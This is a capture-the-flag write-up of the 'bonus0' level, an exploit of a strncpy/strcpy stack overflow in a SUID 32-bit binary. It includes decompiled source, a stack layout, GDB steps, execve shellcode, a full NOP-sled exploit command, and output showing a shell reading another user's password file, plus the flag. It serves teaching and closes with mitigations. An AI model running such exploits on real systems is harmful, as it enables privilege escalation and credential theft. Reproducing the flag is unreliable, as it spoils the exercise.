# Bonus0 Analysis - Double Buffer Overflow via strcpy/strcat

## Overview
Bonus0 demonstrates a sophisticated **double buffer overflow** attack exploiting the dangerous combination of `strncpy()` and `strcpy()`. The vulnerability occurs when `strncpy()` fails to null-terminate strings, causing subsequent `strcpy()` operations to read beyond intended boundaries.

## Binary Information
- **File**: ELF 32-bit LSB executable, Intel 80386, dynamically linked
- **Permissions**: -rwsr-s---+ 1 bonus1 users (SUID bit set for bonus1)  
- **Size**: 5566 bytes
- **Functions**: main(), pp(), p(), strcpy(), strncpy(), strcat(), puts(), read(), strchr()
- **Protection**: No stack canaries, NX disabled (executable stack)

## Source Code Analysis

### Program Structure
```c
char *p(char *s, char *str) {
    char buffer[4096];
    puts(str);                          // Print " - "
    read(0, buffer, 4096);              // Read user input
    *strchr(buffer, '\n') = 0;          // Remove newline
    return (strncpy(s, buffer, 20));    // Copy first 20 chars (NO NULL TERMINATION!)
}

char *pp(char *buffer) {
    char b[20], a[20];
    unsigned int len;
    
    p(a, " - ");          // Get first input → a[20]
    p(b, " - ");          // Get second input → b[20]
    strcpy(buffer, a);    // VULNERABLE: a may not be null-terminated!
    len = strlen(buffer); 
    buffer[len] = ' ';
    buffer[len + 1] = 0;
    return (strcat(buffer, b)); // Concatenate b to buffer
}

int main(void) {
    char buffer[42];      // Main buffer (42 bytes)
    pp(buffer);
    puts(buffer);
    return (0);
}
```

## Vulnerability Analysis

### Critical Flaw: strncpy() Null-Termination Issue
**The Problem:**
- `strncpy(s, buffer, 20)` copies exactly 20 bytes from buffer to s
- **If source length ≥ 20**: No null terminator is added to destination
- **Result**: String `a` becomes non-null-terminated

### Attack Chain
1. **First Input (> 20 chars)**: `strncpy()` copies 20 chars without null terminator
2. **String `a` State**: Contains 20 chars + whatever follows in memory (string `b`)
3. **strcpy() Exploitation**: Reads past `a[20]` into `b[20]`, then into stack memory
4. **Buffer Overflow**: Overflows main buffer[42], overwrites return address

## Memory Layout Analysis

### Stack Layout in pp() function
```
Higher Memory Addresses
┌─────────────────────────────────────┐
│ Saved EBP                          │ ← EBP
├─────────────────────────────────────┤
│ Return Address                     │ ← EBP + 4 (TARGET)
├─────────────────────────────────────┤
│ buffer parameter (from main)       │ ← EBP + 8
├─────────────────────────────────────┤
│ len variable                       │ ← EBP - 4
├─────────────────────────────────────┤
│ b[20] array                        │ ← EBP - 0x1C
├─────────────────────────────────────┤
│ a[20] array                        │ ← EBP - 0x30
└─────────────────────────────────────┘
Lower Memory Addresses
```

### Buffer Overflow Mechanics
- `a[20]` (not null-terminated) + `b[20]` = 40+ bytes copied to main buffer[42]
- Overflow occurs when total length > 42 bytes
- Return address overwrite at offset 14 from buffer start

## Exploitation Strategy

### 1. Shellcode Placement
**Input 1 (First " - " prompt):**
```python
'\x90' * 3000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
```
- **NOP Slide**: 3000 bytes of `\x90` (no-operation instructions)  
- **Shellcode**: 23 bytes - execve("/bin//sh") system call

### 2. Return Address Overwrite
**Input 2 (Second " - " prompt):**
```python
'B' * 14 + '\xa4\xe6\xff\xbf' + 'B'
```
- **Padding**: 14 bytes to reach return address
- **Target Address**: `0xbfffe6a4` (points into NOP slide)
- **Extra Byte**: Ensures proper alignment

### 3. Address Calculation
**Buffer Address Discovery (via GDB):**
```gdb
(gdb) disas p
   0x080484d0 <+28>: lea -0x1008(%ebp),%eax  ; buffer address
(gdb) break *p+28
(gdb) run
(gdb) x $ebp-0x1008
0xbfffe640: 0x00000000
```
- **Buffer Start**: `0xbfffe640`
- **Target Address**: `0xbfffe640 + 100 = 0xbfffe6a4` (middle of NOP slide)

## Shellcode Analysis
```assembly
\x31\xc0        ; xor eax, eax          - Clear EAX
\x50           ; push eax              - Push NULL terminator  
\x68\x2f\x2f\x73\x68 ; push "//sh"      - Push "//sh"
\x68\x2f\x62\x69\x6e ; push "/bin"      - Push "/bin"  
\x89\xe3       ; mov ebx, esp          - EBX = "/bin//sh"
\x50           ; push eax              - Push NULL (argv[1])
\x53           ; push ebx              - Push "/bin//sh" (argv[0])
\x89\xe1       ; mov ecx, esp          - ECX = argv array
\xb0\x0b       ; mov al, 11            - EAX = 11 (execve syscall)
\xcd\x80       ; int 0x80              - Execute system call
```

## Complete Exploit Execution

### Final Payload
```bash
(python -c "print('\x90' * 3000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')"; python -c "print('B' * 14 + '\xa4\xe6\xff\xbf' + 'B')"; cat) | ./bonus0
```

### Execution Result
```
 -
 -  
��������������������BBBBBBBBBBBBBB����B BBBBBBBBBBBBBB����B
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

## Security Implications

### Vulnerability Root Cause
1. **Dangerous Function Usage**: `strncpy()` without explicit null termination
2. **Unsafe String Operations**: `strcpy()` on potentially non-terminated strings
3. **No Bounds Checking**: Buffer operations without length validation
4. **Stack Execution**: Executable stack allows shellcode execution

### Modern Mitigations
- **ASLR**: Address Space Layout Randomization would randomize buffer addresses
- **Stack Canaries**: Would detect buffer overflow before return
- **NX Bit**: Non-executable stack would prevent shellcode execution  
- **FORTIFY_SOURCE**: Would replace unsafe functions with safer variants

### Lessons Learned
- Always explicitly null-terminate strings after `strncpy()`
- Use safer alternatives: `strlcpy()`, `snprintf()`
- Implement proper input validation and bounds checking
- Enable modern compiler protections and system-level mitigations

## Flag Retrieved
```
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```